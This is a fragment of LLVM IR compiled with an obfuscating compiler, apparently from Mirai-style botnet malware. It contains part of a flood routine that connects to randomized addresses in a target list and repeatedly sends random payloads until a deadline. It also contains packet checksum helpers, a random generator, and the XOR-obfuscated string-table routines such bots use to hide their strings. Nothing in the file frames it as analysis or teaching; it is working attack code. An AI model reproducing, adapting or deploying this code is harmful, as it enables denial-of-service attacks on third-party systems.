; <label>:124:                                    ; preds = %123, %106
  %125 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %126 = load i32, i32* %11, align 4
  %127 = sext i32 %126 to i64
  %128 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %125, i64 %127
  %129 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %128, i32 0, i32 2
  %130 = load i8, i8* %129, align 4
  %131 = zext i8 %130 to i32
  %132 = icmp slt i32 %131, 32
  br i1 %132, label %133, label %159

; <label>:133:                                    ; preds = %124
  %134 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %135 = load i32, i32* %11, align 4
  %136 = sext i32 %135 to i64
  %137 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %134, i64 %136
  %138 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %137, i32 0, i32 1
  %139 = load i32, i32* %138, align 4
  %140 = call i32 @ntohl(i32 %139) #7
  %141 = call i32 @rand_next()
  %142 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %143 = load i32, i32* %11, align 4
  %144 = sext i32 %143 to i64
  %145 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %142, i64 %144
  %146 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %145, i32 0, i32 2
  %147 = load i8, i8* %146, align 4
  %148 = zext i8 %147 to i32
  %149 = lshr i32 %141, %148
  %150 = add i32 %140, %149
  %151 = call i32 @htonl(i32 %150) #7
  %152 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %153 = load i32, i32* %11, align 4
  %154 = sext i32 %153 to i64
  %155 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %152, i64 %154
  %156 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %155, i32 0, i32 0
  %157 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %156, i32 0, i32 2
  %158 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %157, i32 0, i32 0
  store i32 %151, i32* %158, align 4
  br label %159

; <label>:159:                                    ; preds = %133, %124
  %160 = load i32*, i32** %13, align 8
  %161 = load i32, i32* %11, align 4
  %162 = sext i32 %161 to i64
  %163 = getelementptr inbounds i32, i32* %160, i64 %162
  %164 = load i32, i32* %163, align 4
  %165 = bitcast %union.__CONST_SOCKADDR_ARG* %24 to %struct.sockaddr**
  %166 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %167 = load i32, i32* %11, align 4
  %168 = sext i32 %167 to i64
  %169 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %166, i64 %168
  %170 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %169, i32 0, i32 0
  %171 = bitcast %struct.sockaddr_in* %170 to %struct.sockaddr*
  store %struct.sockaddr* %171, %struct.sockaddr** %165, align 8
  %172 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %24, i32 0, i32 0
  %173 = load %struct.sockaddr*, %struct.sockaddr** %172, align 8
  %174 = call i32 @connect(i32 %164, %struct.sockaddr* %173, i32 16)
  %175 = icmp eq i32 %174, -1
  br i1 %175, label %176, label %177

; <label>:176:                                    ; preds = %159
  br label %177

; <label>:177:                                    ; preds = %176, %159
  br label %178

; <label>:178:                                    ; preds = %177
  %179 = load i32, i32* %11, align 4
  %180 = add nsw i32 %179, 1
  store i32 %180, i32* %11, align 4
  br label %66

; <label>:181:                                    ; preds = %66
  br label %182

; <label>:182:                                    ; preds = %223, %181
  store i32 0, i32* %11, align 4
  br label %183

; <label>:183:                                    ; preds = %214, %182
  %184 = load i32, i32* %11, align 4
  %185 = load i8, i8* %7, align 1
  %186 = zext i8 %185 to i32
  %187 = icmp slt i32 %184, %186
  br i1 %187, label %188, label %217

; <label>:188:                                    ; preds = %183
  %189 = load i8**, i8*** %12, align 8
  %190 = load i32, i32* %11, align 4
  %191 = sext i32 %190 to i64
  %192 = getelementptr inbounds i8*, i8** %189, i64 %191
  %193 = load i8*, i8** %192, align 8
  store i8* %193, i8** %25, align 8
  %194 = load i8, i8* %17, align 1
  %195 = icmp ne i8 %194, 0
  br i1 %195, label %196, label %204

; <label>:196:                                    ; preds = %188
  %197 = load i8*, i8** %25, align 8
  %198 = load i16, i16* %16, align 2
  %199 = zext i16 %198 to i32
  call void @rand_alphastr(i8* %197, i32 %199)
  %200 = load i8*, i8** %25, align 8
  %201 = load i16, i16* %16, align 2
  %202 = zext i16 %201 to i64
  %203 = getelementptr inbounds i8, i8* %200, i64 %202
  store i8 0, i8* %203, align 1
  br label %204

; <label>:204:                                    ; preds = %196, %188
  %205 = load i32*, i32** %13, align 8
  %206 = load i32, i32* %11, align 4
  %207 = sext i32 %206 to i64
  %208 = getelementptr inbounds i32, i32* %205, i64 %207
  %209 = load i32, i32* %208, align 4
  %210 = load i8*, i8** %25, align 8
  %211 = load i16, i16* %16, align 2
  %212 = zext i16 %211 to i64
  %213 = call i64 @send(i32 %209, i8* %210, i64 %212, i32 16384)
  br label %214

; <label>:214:                                    ; preds = %204
  %215 = load i32, i32* %11, align 4
  %216 = add nsw i32 %215, 1
  store i32 %216, i32* %11, align 4
  br label %183

; <label>:217:                                    ; preds = %183
  %218 = call i64 @time(i64* null) #6
  %219 = load i32, i32* %19, align 4
  %220 = sext i32 %219 to i64
  %221 = icmp sgt i64 %218, %220
  br i1 %221, label %222, label %223

; <label>:222:                                    ; preds = %217
  br label %224

; <label>:223:                                    ; preds = %217
  br label %182

; <label>:224:                                    ; preds = %222, %105
  ret void
}

; Function Attrs: nounwind
declare i32 @bind(i32, %struct.sockaddr*, i32) #1

; Function Attrs: noinline nounwind uwtable
define zeroext i16 @checksum_generic(i16*, i32) #0 {
  %3 = alloca i16*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i64, align 8
  store i16* %0, i16** %3, align 8
  store i32 %1, i32* %4, align 4
  store i64 0, i64* %5, align 8
  store i64 0, i64* %5, align 8
  br label %6

; <label>:6:                                      ; preds = %16, %2
  %7 = load i32, i32* %4, align 4
  %8 = icmp ugt i32 %7, 1
  br i1 %8, label %9, label %19

; <label>:9:                                      ; preds = %6
  %10 = load i16*, i16** %3, align 8
  %11 = getelementptr inbounds i16, i16* %10, i32 1
  store i16* %11, i16** %3, align 8
  %12 = load i16, i16* %10, align 2
  %13 = zext i16 %12 to i64
  %14 = load i64, i64* %5, align 8
  %15 = add i64 %14, %13
  store i64 %15, i64* %5, align 8
  br label %16

; <label>:16:                                     ; preds = %9
  %17 = load i32, i32* %4, align 4
  %18 = sub i32 %17, 2
  store i32 %18, i32* %4, align 4
  br label %6

; <label>:19:                                     ; preds = %6
  %20 = load i32, i32* %4, align 4
  %21 = icmp eq i32 %20, 1
  br i1 %21, label %22, label %29

; <label>:22:                                     ; preds = %19
  %23 = load i16*, i16** %3, align 8
  %24 = load i16, i16* %23, align 2
  %25 = trunc i16 %24 to i8
  %26 = sext i8 %25 to i64
  %27 = load i64, i64* %5, align 8
  %28 = add i64 %27, %26
  store i64 %28, i64* %5, align 8
  br label %29

; <label>:29:                                     ; preds = %22, %19
  %30 = load i64, i64* %5, align 8
  %31 = lshr i64 %30, 16
  %32 = load i64, i64* %5, align 8
  %33 = and i64 %32, 65535
  %34 = add i64 %31, %33
  store i64 %34, i64* %5, align 8
  %35 = load i64, i64* %5, align 8
  %36 = lshr i64 %35, 16
  %37 = load i64, i64* %5, align 8
  %38 = add i64 %37, %36
  store i64 %38, i64* %5, align 8
  %39 = load i64, i64* %5, align 8
  %40 = xor i64 %39, -1
  %41 = trunc i64 %40 to i16
  ret i16 %41
}

; Function Attrs: noinline nounwind uwtable
define zeroext i16 @checksum_tcpudp(%struct.iphdr*, i8*, i16 zeroext, i32) #0 {
  %5 = alloca %struct.iphdr*, align 8
  %6 = alloca i8*, align 8
  %7 = alloca i16, align 2
  %8 = alloca i32, align 4
  %9 = alloca i16*, align 8
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  store %struct.iphdr* %0, %struct.iphdr** %5, align 8
  store i8* %1, i8** %6, align 8
  store i16 %2, i16* %7, align 2
  store i32 %3, i32* %8, align 4
  %14 = load i8*, i8** %6, align 8
  %15 = bitcast i8* %14 to i16*
  store i16* %15, i16** %9, align 8
  %16 = load %struct.iphdr*, %struct.iphdr** %5, align 8
  %17 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %16, i32 0, i32 8
  %18 = load i32, i32* %17, align 4
  store i32 %18, i32* %10, align 4
  %19 = load %struct.iphdr*, %struct.iphdr** %5, align 8
  %20 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %19, i32 0, i32 9
  %21 = load i32, i32* %20, align 4
  store i32 %21, i32* %11, align 4
  store i32 0, i32* %12, align 4
  %22 = load i32, i32* %8, align 4
  store i32 %22, i32* %13, align 4
  br label %23

; <label>:23:                                     ; preds = %26, %4
  %24 = load i32, i32* %8, align 4
  %25 = icmp sgt i32 %24, 1
  br i1 %25, label %26, label %36

; <label>:26:                                     ; preds = %23
  %27 = load i16*, i16** %9, align 8
  %28 = load i16, i16* %27, align 2
  %29 = zext i16 %28 to i32
  %30 = load i32, i32* %12, align 4
  %31 = add i32 %30, %29
  store i32 %31, i32* %12, align 4
  %32 = load i16*, i16** %9, align 8
  %33 = getelementptr inbounds i16, i16* %32, i32 1
  store i16* %33, i16** %9, align 8
  %34 = load i32, i32* %8, align 4
  %35 = sub nsw i32 %34, 2
  store i32 %35, i32* %8, align 4
  br label %23

; <label>:36:                                     ; preds = %23
  %37 = load i32, i32* %8, align 4
  %38 = icmp eq i32 %37, 1
  br i1 %38, label %39, label %46

; <label>:39:                                     ; preds = %36
  %40 = load i16*, i16** %9, align 8
  %41 = bitcast i16* %40 to i8*
  %42 = load i8, i8* %41, align 1
  %43 = zext i8 %42 to i32
  %44 = load i32, i32* %12, align 4
  %45 = add i32 %44, %43
  store i32 %45, i32* %12, align 4
  br label %46

; <label>:46:                                     ; preds = %39, %36
  %47 = load i32, i32* %10, align 4
  %48 = lshr i32 %47, 16
  %49 = and i32 %48, 65535
  %50 = load i32, i32* %12, align 4
  %51 = add i32 %50, %49
  store i32 %51, i32* %12, align 4
  %52 = load i32, i32* %10, align 4
  %53 = and i32 %52, 65535
  %54 = load i32, i32* %12, align 4
  %55 = add i32 %54, %53
  store i32 %55, i32* %12, align 4
  %56 = load i32, i32* %11, align 4
  %57 = lshr i32 %56, 16
  %58 = and i32 %57, 65535
  %59 = load i32, i32* %12, align 4
  %60 = add i32 %59, %58
  store i32 %60, i32* %12, align 4
  %61 = load i32, i32* %11, align 4
  %62 = and i32 %61, 65535
  %63 = load i32, i32* %12, align 4
  %64 = add i32 %63, %62
  store i32 %64, i32* %12, align 4
  %65 = load %struct.iphdr*, %struct.iphdr** %5, align 8
  %66 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %65, i32 0, i32 6
  %67 = load i8, i8* %66, align 1
  %68 = zext i8 %67 to i16
  %69 = call zeroext i16 @htons(i16 zeroext %68) #7
  %70 = zext i16 %69 to i32
  %71 = load i32, i32* %12, align 4
  %72 = add i32 %71, %70
  store i32 %72, i32* %12, align 4
  %73 = load i16, i16* %7, align 2
  %74 = zext i16 %73 to i32
  %75 = load i32, i32* %12, align 4
  %76 = add i32 %75, %74
  store i32 %76, i32* %12, align 4
  br label %77

; <label>:77:                                     ; preds = %81, %46
  %78 = load i32, i32* %12, align 4
  %79 = lshr i32 %78, 16
  %80 = icmp ne i32 %79, 0
  br i1 %80, label %81, label %87

; <label>:81:                                     ; preds = %77
  %82 = load i32, i32* %12, align 4
  %83 = and i32 %82, 65535
  %84 = load i32, i32* %12, align 4
  %85 = lshr i32 %84, 16
  %86 = add i32 %83, %85
  store i32 %86, i32* %12, align 4
  br label %77

; <label>:87:                                     ; preds = %77
  %88 = load i32, i32* %12, align 4
  %89 = xor i32 %88, -1
  %90 = trunc i32 %89 to i16
  ret i16 %90
}

; Function Attrs: noinline nounwind uwtable
define i32 @rand_next() #0 {
  %1 = alloca i32, align 4
  %2 = load i32, i32* @x, align 4
  store i32 %2, i32* %1, align 4
  %3 = load i32, i32* %1, align 4
  %4 = shl i32 %3, 11
  %5 = load i32, i32* %1, align 4
  %6 = xor i32 %5, %4
  store i32 %6, i32* %1, align 4
  %7 = load i32, i32* %1, align 4
  %8 = lshr i32 %7, 8
  %9 = load i32, i32* %1, align 4
  %10 = xor i32 %9, %8
  store i32 %10, i32* %1, align 4
  %11 = load i32, i32* @y, align 4
  store i32 %11, i32* @x, align 4
  %12 = load i32, i32* @z, align 4
  store i32 %12, i32* @y, align 4
  %13 = load i32, i32* @w, align 4
  store i32 %13, i32* @z, align 4
  %14 = load i32, i32* @w, align 4
  %15 = lshr i32 %14, 19
  %16 = load i32, i32* @w, align 4
  %17 = xor i32 %16, %15
  store i32 %17, i32* @w, align 4
  %18 = load i32, i32* %1, align 4
  %19 = load i32, i32* @w, align 4
  %20 = xor i32 %19, %18
  store i32 %20, i32* @w, align 4
  %21 = load i32, i32* @w, align 4
  ret i32 %21
}

; Function Attrs: noinline nounwind uwtable
define void @rand_alphastr(i8*, i32) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  %5 = alloca [32 x i8], align 16
  store i8* %0, i8** %3, align 8
  store i32 %1, i32* %4, align 4
  call void @table_unlock_val(i8 zeroext 61)
  %6 = getelementptr inbounds [32 x i8], [32 x i8]* %5, i32 0, i32 0
  %7 = call i8* @table_retrieve_val(i32 61, i32* null)
  %8 = call i8* @strcpy(i8* %6, i8* %7) #6
  br label %9

; <label>:9:                                      ; preds = %13, %2
  %10 = load i32, i32* %4, align 4
  %11 = add nsw i32 %10, -1
  store i32 %11, i32* %4, align 4
  %12 = icmp ne i32 %10, 0
  br i1 %12, label %13, label %23

; <label>:13:                                     ; preds = %9
  %14 = call i32 @rand_next()
  %15 = getelementptr inbounds [32 x i8], [32 x i8]* %5, i32 0, i32 0
  %16 = call i32 @util_strlen(i8* %15)
  %17 = urem i32 %14, %16
  %18 = zext i32 %17 to i64
  %19 = getelementptr inbounds [32 x i8], [32 x i8]* %5, i64 0, i64 %18
  %20 = load i8, i8* %19, align 1
  %21 = load i8*, i8** %3, align 8
  %22 = getelementptr inbounds i8, i8* %21, i32 1
  store i8* %22, i8** %3, align 8
  store i8 %20, i8* %21, align 1
  br label %9

; <label>:23:                                     ; preds = %9
  call void @table_lock_val(i8 zeroext 61)
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @table_unlock_val(i8 zeroext) #0 {
  %2 = alloca i8, align 1
  %3 = alloca %struct.table_value*, align 8
  store i8 %0, i8* %2, align 1
  %4 = load i8, i8* %2, align 1
  %5 = zext i8 %4 to i64
  %6 = getelementptr inbounds [63 x %struct.table_value], [63 x %struct.table_value]* @table, i64 0, i64 %5
  store %struct.table_value* %6, %struct.table_value** %3, align 8
  %7 = load i8, i8* %2, align 1
  call void @toggle_obf(i8 zeroext %7)
  ret void
}

; Function Attrs: noinline nounwind uwtable
define internal void @toggle_obf(i8 zeroext) #0 {
  %2 = alloca i8, align 1
  %3 = alloca i32, align 4
  %4 = alloca %struct.table_value*, align 8
  %5 = alloca i8, align 1
  %6 = alloca i8, align 1
  %7 = alloca i8, align 1
  %8 = alloca i8, align 1
  store i8 %0, i8* %2, align 1
  %9 = load i8, i8* %2, align 1
  %10 = zext i8 %9 to i64
  %11 = getelementptr inbounds [63 x %struct.table_value], [63 x %struct.table_value]* @table, i64 0, i64 %10
  store %struct.table_value* %11, %struct.table_value** %4, align 8
  %12 = load i32, i32* @table_key, align 4
  %13 = and i32 %12, 255
  %14 = trunc i32 %13 to i8
  store i8 %14, i8* %5, align 1
  %15 = load i32, i32* @table_key, align 4
  %16 = lshr i32 %15, 8
  %17 = and i32 %16, 255
  %18 = trunc i32 %17 to i8
  store i8 %18, i8* %6, align 1
  %19 = load i32, i32* @table_key, align 4
  %20 = lshr i32 %19, 16
  %21 = and i32 %20, 255
  %22 = trunc i32 %21 to i8
  store i8 %22, i8* %7, align 1
  %23 = load i32, i32* @table_key, align 4
  %24 = lshr i32 %23, 24
  %25 = and i32 %24, 255
  %26 = trunc i32 %25 to i8
  store i8 %26, i8* %8, align 1
  store i32 0, i32* %3, align 4
  br label %27

; <label>:27:                                     ; preds = %83, %1
  %28 = load i32, i32* %3, align 4
  %29 = load %struct.table_value*, %struct.table_value** %4, align 8
  %30 = getelementptr inbounds %struct.table_value, %struct.table_value* %29, i32 0, i32 1
  %31 = load i16, i16* %30, align 8
  %32 = zext i16 %31 to i32
  %33 = icmp slt i32 %28, %32
  br i1 %33, label %34, label %86

; <label>:34:                                     ; preds = %27
  %35 = load i8, i8* %5, align 1
  %36 = zext i8 %35 to i32
  %37 = load %struct.table_value*, %struct.table_value** %4, align 8
  %38 = getelementptr inbounds %struct.table_value, %struct.table_value* %37, i32 0, i32 0
  %39 = load i8*, i8** %38, align 8
  %40 = load i32, i32* %3, align 4
  %41 = sext i32 %40 to i64
  %42 = getelementptr inbounds i8, i8* %39, i64 %41
  %43 = load i8, i8* %42, align 1
  %44 = sext i8 %43 to i32
  %45 = xor i32 %44, %36
  %46 = trunc i32 %45 to i8
  store i8 %46, i8* %42, align 1
  %47 = load i8, i8* %6, align 1
  %48 = zext i8 %47 to i32
  %49 = load %struct.table_value*, %struct.table_value** %4, align 8
  %50 = getelementptr inbounds %struct.table_value, %struct.table_value* %49, i32 0, i32 0
  %51 = load i8*, i8** %50, align 8
  %52 = load i32, i32* %3, align 4
  %53 = sext i32 %52 to i64
  %54 = getelementptr inbounds i8, i8* %51, i64 %53
  %55 = load i8, i8* %54, align 1
  %56 = sext i8 %55 to i32
  %57 = xor i32 %56, %48
  %58 = trunc i32 %57 to i8
  store i8 %58, i8* %54, align 1
  %59 = load i8, i8* %7, align 1
  %60 = zext i8 %59 to i32
  %61 = load %struct.table_value*, %struct.table_value** %4, align 8
  %62 = getelementptr inbounds %struct.table_value, %struct.table_value* %61, i32 0, i32 0
  %63 = load i8*, i8** %62, align 8
  %64 = load i32, i32* %3, align 4
  %65 = sext i32 %64 to i64
  %66 = getelementptr inbounds i8, i8* %63, i64 %65
  %67 = load i8, i8* %66, align 1
  %68 = sext i8 %67 to i32
  %69 = xor i32 %68, %60
  %70 = trunc i32 %69 to i8
  store i8 %70, i8* %66, align 1
  %71 = load i8, i8* %8, align 1
  %72 = zext i8 %71 to i32
  %73 = load %struct.table_value*, %struct.table_value** %4, align 8
  %74 = getelementptr inbounds %struct.table_value, %struct.table_value* %73, i32 0, i32 0
  %75 = load i8*, i8** %74, align 8
  %76 = load i32, i32* %3, align 4
  %77 = sext i32 %76 to i64
  %78 = getelementptr inbounds i8, i8* %75, i64 %77
  %79 = load i8, i8* %78, align 1
  %80 = sext i8 %79 to i32
  %81 = xor i32 %80, %72
  %82 = trunc i32 %81 to i8
  store i8 %82, i8* %78, align 1
  br label %83

; <label>:83:                                     ; preds = %34
  %84 = load i32, i32* %3, align 4
  %85 = add nsw i32 %84, 1
  store i32 %85, i32* %3, align 4
  br label %27

; <label>:86:                                     ; preds = %27
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @table_lock_val(i8 zeroext) #0 {
  %2 = alloca i8, align 1
  %3 = alloca %struct.table_value*, align 8
  store i8 %0, i8* %2, align 1
  %4 = load i8, i8* %2, align 1
  %5 = zext i8 %4 to i64
  %6 = getelementptr inbounds [63 x %struct.table_value], [63 x %struct.table_value]* @table, i64 0, i64 %5
  store %struct.table_value* %6, %struct.table_value** %3, align 8
  %7 = load i8, i8* %2, align 1
  call void @toggle_obf(i8 zeroext %7)
  ret void
}

; Function Attrs: noinline nounwind uwtable
define i8* @table_retrieve_val(i32, i32*) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32*, align 8
  %5 = alloca %struct.table_value*, align 8
  store i32 %0, i32* %3, align 4
  store i32* %1, i32** %4, align 8
  %6 = load i32, i32* %3, align 4
  %7 = sext i32 %6 to i64
  %8 = getelementptr inbounds [63 x %struct.table_value], [63 x %struct.table_value]* @table, i64 0, i64 %7
  store %struct.table_value* %8, %struct.table_value** %5, align 8
  %9 = load i32*, i32** %4, align 8
  %10 = icmp ne i32* %9, null
  br i1 %10, label %11, label %17

; <label>:11:                                     ; preds = %2
  %12 = load %struct.table_value*, %struct.table_value** %5, align 8
  %13 = getelementptr inbounds %struct.table_value, %struct.table_value* %12, i32 0, i32 1
  %14 = load i16, i16* %13, align 8
  %15 = zext i16 %14 to i32
  %16 = load i32*, i32** %4, align 8
  store i32 %15, i32* %16, align 4
  br label %17

; <label>:17:                                     ; preds = %11, %2
  %18 = load %struct.table_value*, %struct.table_value** %5, align 8
  %19 = getelementptr inbounds %struct.table_value, %struct.table_value* %18, i32 0, i32 0
  %20 = load i8*, i8** %19, align 8
  ret i8* %20
}

; Function Attrs: noinline nounwind uwtable
define i32 @util_memsearch(i8*, i32, i8*, i32) #0 {
  %5 = alloca i32, align 4
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i8*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  store i8* %0, i8** %6, align 8
  store i32 %1, i32* %7, align 4
  store i8* %2, i8** %8, align 8
  store i32 %3, i32* %9, align 4
  store i32 0, i32* %11, align 4
  %12 = load i32, i32* %9, align 4
  %13 = load i32, i32* %7, align 4
  %14 = icmp sgt i32 %12, %13
  br i1 %14, label %15, label %16

; <label>:15:                                     ; preds = %4
  store i32 -1, i32* %5, align 4
  br label %50

; <label>:16:                                     ; preds = %4
  store i32 0, i32* %10, align 4
  br label %17

; <label>:17:                                     ; preds = %46, %16
  %18 = load i32, i32* %10, align 4
  %19 = load i32, i32* %7, align 4
  %20 = icmp slt i32 %18, %19
  br i1 %20, label %21, label %49

; <label>:21:                                     ; preds = %17
  %22 = load i8*, i8** %6, align 8
  %23 = load i32, i32* %10, align 4
  %24 = sext i32 %23 to i64
  %25 = getelementptr inbounds i8, i8* %22, i64 %24
  %26 = load i8, i8* %25, align 1
  %27 = sext i8 %26 to i32
  %28 = load i8*, i8** %8, align 8
  %29 = load i32, i32* %11, align 4
  %30 = sext i32 %29 to i64
  %31 = getelementptr inbounds i8, i8* %28, i64 %30
  %32 = load i8, i8* %31, align 1
  %33 = sext i8 %32 to i32
  %34 = icmp eq i32 %27, %33
  br i1 %34, label %35, label %44

; <label>:35:                                     ; preds = %21
  %36 = load i32, i32* %11, align 4
  %37 = add nsw i32 %36, 1
  store i32 %37, i32* %11, align 4
  %38 = load i32, i32* %9, align 4
  %39 = icmp eq i32 %37, %38
  br i1 %39, label %40, label %43

; <label>:40:                                     ; preds = %35
  %41 = load i32, i32* %10, align 4
  %42 = add nsw i32 %41, 1
  store i32 %42, i32* %5, align 4
  br label %50

; <label>:43:                                     ; preds = %35
  br label %45

; <label>:44:                                     ; preds = %21
  store i32 0, i32* %11, align 4
  br label %45

; <label>:45:                                     ; preds = %44, %43
  br label %46

; <label>:46:                                     ; preds = %45
  %47 = load i32, i32* %10, align 4
  %48 = add nsw i32 %47, 1
  store i32 %48, i32* %10, align 4
  br label %17

; <label>:49:                                     ; preds = %17
  store i32 -1, i32* %5, align 4
  br label %50

; <label>:50:                                     ; preds = %49, %40, %15
  %51 = load i32, i32* %5, align 4
  ret i32 %51
}

attributes #0 = { noinline nounwind uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { nounwind readnone "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #4 = { noreturn nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #5 = { argmemonly nounwind }
attributes #6 = { nounwind }
attributes #7 = { nounwind readnone }
attributes #8 = { noreturn nounwind }

!llvm.ident = !{!0, !0, !0, !0, !0, !0, !0, !0, !0, !0, !0, !0, !0, !0, !0, !0, !0, !0}

!0 = !{!"Obfuscator-LLVM clang version 4.0.1  (based on Obfuscator-LLVM 4.0.1)"}
!1 = !{i32 -2146846898}
!2 = !{i32 -2146846489}
